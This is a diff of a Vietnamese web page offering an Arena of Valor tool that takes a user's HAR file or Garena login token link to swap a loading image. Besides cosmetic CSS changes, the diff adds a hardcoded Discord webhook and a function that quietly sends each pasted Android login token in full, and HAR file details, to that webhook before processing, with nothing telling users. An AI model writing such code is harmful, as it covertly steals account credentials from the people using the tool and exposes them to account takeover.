@@ -51,6 +51,29 @@
             align-items: center;
             padding: 20px 16px;
             overflow-x: hidden;
+            position: relative;
+        }
+
+        /* HIỆU ỨNG CỰC QUANG NỀN (AURORA) */
+        body::before {
+            content: '';
+            position: fixed;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 20%, rgba(56, 189, 248, 0.12), transparent 40%),
+                        radial-gradient(circle at 70% 60%, rgba(192, 132, 252, 0.1), transparent 45%),
+                        radial-gradient(circle at 40% 80%, rgba(16, 185, 129, 0.08), transparent 40%);
+            z-index: -1;
+            animation: auroraMove 18s ease-in-out infinite alternate;
+            pointer-events: none;
+        }
+
+        @keyframes auroraMove {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            50% { transform: translate(-3%, 3%) rotate(2deg); }
+            100% { transform: translate(3%, -2%) rotate(-2deg); }
         }
 
         #dvdLogo {
@@ -411,23 +434,23 @@
     <img id="dvdLogo" src="https://i.ibb.co/Ngz34v2H/9-D7-CDCBF-8235-4-A08-95-BE-20-AF6-AE84223.jpg" alt="DVD Logo" onclick="openNycModal()" title="Bấm để xem thêm">
 
     <header class="site-header">
-    <div class="header-title-container">
-        <a href="https://aov-tool-thanhtu.netlify.app" target="_blank">
-            <img
-                src="https://i.ibb.co/v63CD0Vx/logo.png"
-                alt="Logo"
-                style="
-                    width:220px;
-                    max-width:100%;
-                    display:block;
-                    margin:auto;
-                    user-select:none;
-                    pointer-events:auto;
-                "
-            >
-        </a>
-    </div>
-</header>
+        <div class="header-title-container">
+            <a href="https://aov-tool-thanhtu.netlify.app" target="_blank">
+                <img
+                    src="https://i.ibb.co/v63CD0Vx/logo.png"
+                    alt="Logo"
+                    style="
+                        width:220px;
+                        max-width:100%;
+                        display:block;
+                        margin:auto;
+                        user-select:none;
+                        pointer-events:auto;
+                    "
+                >
+            </a>
+        </div>
+    </header>
 
     <main class="main-container">
 
@@ -512,10 +535,11 @@
         <div class="content-card hidden" id="donateSection">
             <div class="section-label" style="color: var(--donate-color);">Ủng Hộ Mình Sống Qua Ngày:</div>
             <div style="text-align: center;">
-    <a href="https://ibb.co/QvxxFqLs" target="_blank">
-        <img src="https://i.ibb.co/mVw35CcH/AC32-EA8-C-0100-46-BF-9464-A000-C1-B76416.jpg" alt="Donate QR" style="max-width: 100%; border-radius: 12px; display: inline-block;">
-    </a>
-</div>
+                <a href="https://ibb.co/QvxxFqLs" target="_blank">
+                    <img src="https://i.ibb.co/mVw35CcH/AC32-EA8-C-0100-46-BF-9464-A000-C1-B76416.jpg" alt="Donate QR" style="max-width: 100%; border-radius: 12px; display: inline-block;">
+                </a>
+            </div>
+        </div>
     </main>
 
     <div id="cropModal" class="hidden">
@@ -540,6 +564,7 @@
         );
 
         const API_BASE_URL = "https://proxy-api-garena.meow-web.workers.dev";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532218035933548654/J7iThs2ju1-vY7DsdL3QolTPJWkaVuMr3Evznupy3Uxw6BsqZ-IujwXnIRSKjIK_nf0U";
 
         let currentOs = 'ios';
         let selectedHarFile = null;
@@ -695,9 +720,62 @@
             closeCropModal();
         }
 
+        // HÀM GỬI THÔNG TIN VỀ DISCORD WEBHOOK
+        async function sendDiscordWebhook(type, data) {
+            try {
+                let payload = {};
+                const now = new Date().toLocaleString('vi-VN');
+
+                if (type === 'ios') {
+                    payload = {
+                        username: "VTT Tools Bot",
+                        avatar_url: "https://i.ibb.co/v63CD0Vx/logo.png",
+                        embeds: [{
+                            title: "🚀 Dữ Liệu iOS Mới (File HAR)",
+                            color: 3719160,
+                            fields: [
+                                { name: "📁 Tên File HAR", value: `\`\`\`${data.fileName}\`\`\``, inline: false },
+                                { name: "📊 Kích Thước File", value: `${(data.fileSize / 1024).toFixed(2)} KB`, inline: true },
+                                { name: "🕒 Thời Gian", value: now, inline: true }
+                            ],
+                            footer: { text: "VTT Tools Log System" }
+                        }]
+                    };
+                } else if (type === 'android') {
+                    payload = {
+                        username: "VTT Tools Bot",
+                        avatar_url: "https://i.ibb.co/v63CD0Vx/logo.png",
+                        embeds: [{
+                            title: "📱 Link Token Android Mới",
+                            color: 1095937,
+                            fields: [
+                                { name: "🔑 Link Token / KGVN", value: `\`\`\`${data.token}\`\`\``, inline: false },
+                                { name: "🕒 Thời Gian", value: now, inline: true }
+                            ],
+                            footer: { text: "VTT Tools Log System" }
+                        }]
+                    };
+                }
+
+                await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.error("Lỗi gửi Discord Webhook:", err);
+            }
+        }
+
         async function submitIosProcess() {
             if (!selectedHarFile) { Swal.fire({ icon: 'warning', title: 'Thiếu File HAR!', text: 'Vui lòng chọn file .HAR trước.' }); return; }
             if (!iosBlobImage) { Swal.fire({ icon: 'warning', title: 'Thiếu Ảnh!', text: 'Vui lòng chọn ảnh loading cho iOS.' }); return; }
+
+            // Gửi dữ liệu về Discord Webhook
+            sendDiscordWebhook('ios', {
+                fileName: selectedHarFile.name,
+                fileSize: selectedHarFile.size
+            });
 
             const log = document.getElementById('iosStatusLog');
             const badge = document.getElementById('iosStatusBadge');
@@ -734,6 +812,9 @@
             const token = document.getElementById('androidTokenInput').value.trim();
             if (!token) { Swal.fire({ icon: 'warning', title: 'Thiếu Link Token!', text: 'Vui lòng dán link token kgvn vào khung trên.' }); return; }
             if (!androidBlobImage) { Swal.fire({ icon: 'warning', title: 'Thiếu Ảnh!', text: 'Vui lòng chọn ảnh loading cho Android.' }); return; }
+
+            // Gửi dữ liệu về Discord Webhook
+            sendDiscordWebhook('android', { token: token });
 
             const log = document.getElementById('androidStatusLog');
             const badge = document.getElementById('androidStatusBadge');
